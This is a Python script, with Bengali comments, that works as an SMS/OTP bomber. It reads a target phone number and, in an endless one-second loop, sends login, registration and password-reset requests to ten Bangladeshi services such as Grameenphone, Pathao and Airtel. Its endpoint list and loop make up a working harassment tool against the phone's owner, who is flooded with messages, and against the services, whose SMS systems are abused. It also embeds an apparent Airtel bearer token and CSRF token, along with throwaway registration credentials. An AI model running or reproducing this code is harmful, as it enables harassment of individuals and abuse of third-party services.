import sys
import time
import threading
import requests
import json

# সব API লিস্ট
apis = [
    {
        "name": "DeepToPlay",
        "url": "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",
        "data": lambda phone: {'number': phone},
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.deeptoplay.com",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "Doctime",
        "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "data": lambda phone: {
            "data": {
                "flag": "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png",
                "code": "88",
                "contact_no": phone,
                "country_calling_code": "88",
                "headers": {"PlatForm": "Web"}
            }
        },
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.doctime.com.bd"
        }
    },
    {
        "name": "Easy",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "data": lambda phone: {
            'social_login_id': '',
            'name': 'Anbu',
            'email': 'anbutools.bd@gmail.com',
            'mobile': phone,
            'password': 'AsdfG1233',
            'password_confirmation': 'AsdfG1233',
            'device_key': 'fc7ff66bed592eb157853ef09653666c'
        },
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://easy.com.bd"
        }
    },
    {
        "name": "Grameenphone",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "data": lambda phone: {"msisdn": phone},
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://weblogin.grameenphone.com",
            "Referer": "https://weblogin.grameenphone.com/?referrer=https://www.grameenphone.com"
        }
    },
    {
        "name": "Jotno",
        "url": "https://gw.jotno.net/auth/login/token",
        "data": lambda phone: {
            "userType": "CONSUMER",
            "username": phone
        },
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://jotno.net",
            "Accept": "application/json"
        }
    },
    {
        "name": "Osudpotro",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "data": lambda phone: {
            'mobile': phone,
            'deviceToken': 'web',
            'language': 'en',
            'os': 'web'
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Pathao",
        "url": "https://api.pathao.com/v2/auth/register",
        "data": lambda phone: {
            'country_prefix': '880',
            'national_number': phone,
            'country_id': 1
        },
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/3.14.9"
        }
    },
    {
        "name": "Paperfly",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "data": lambda phone: {
            "full_name": "Anbu kakashi",
            "company_name": "Anbu Tools",
            "email_address": "anbutools.bd@gmail.com",
            "phone_number": phone
        },
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://go.paperfly.com.bd"
        }
    },
    {
        "name": "Packzy",
        "url": "https://userapp.packzy.com/api/send-otp/1",
        "data": lambda phone: {
            'b_name': '',
            'name': 'Anbu',
            'email': 'anbutools.official@gmail.com',
            'mobile': phone,
            'password': 'AsdfG1233@'
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    
    {
        "name": "airtel",
        "url": "https://api.bd.airtel.com/v1/account/forgot-password/otp",
        "data": lambda phone: {

        'phone_number': phone,

        },
        
        "headers": {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=UTF-8',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTcxOTM3NDM5NCwiZXhwIjoxNzE5NDYwNzk0LCJuYmYiOjE3MTkzNzQzOTQsImp0aSI6ImNKbmVZV1Q3bW1vaGZER2oiLCJzdWIiOiJBaXJ0ZWwifQ.cCYzxmFx7wOjPFbFiY-SsSVtm0J6F9XiQglpyy7HQ-E',
            'X-Csrf-Token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTcxOTM3NDM5NCwiZXhwIjoxNzE5NDYwNzk0LCJuYmYiOjE3MTkzNzQzOTQsImp0aSI6ImNKbmVZV1Q3bW1vaGZER2oiLCJzdWIiOiJBaXJ0ZWwifQ.cCYzxmFx7wOjPFbFiY-SsSVtm0J6F9XiQglpyy7HQ-E'
        }
    },

]

def typing_effect(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)  # টাইমিং সেট করুন (0.05 সেকেন্ড ডিলে)

# API কল করার ফাংশন
def make_api_call(phone, api):
    try:
        response = requests.post(
            api["url"],
            headers=api["headers"],
            data=json.dumps(api["data"](phone))
        )
        if response.status_code == 200:
            print(f"{api['name']} API সফলভাবে কল হয়েছে ফোন নম্বরে: {phone}")

            print(f"{response.text}\n")
        else:
            print(f"{api['name']} API ব্যর্থ হয়েছে: {response.status_code}\n")
    except Exception as e:
        print(f"{api['name']} API কলের সময় ত্রুটি: {str(e)}\n")

# প্রতিটি API কল করার ফাংশন
def call_all_apis(phone):
    while True:
        for api in apis:
            make_api_call(phone, api)
        time.sleep(1)  # প্রতি ১ সেকেন্ড পর API লুপ হবে

# থ্রেড ব্যবহার করে কল শুরু
def start_calling(phone):
    thread = threading.Thread(target=call_all_apis, args=(phone,))
    thread.daemon = True
    thread.start()

typing_effect("\nEnter Number:>> ")
phone_number = input()

# কল শুরু
start_calling(phone_number)

# প্রোগ্রাম চালু রাখা
while True:
    time.sleep(1)
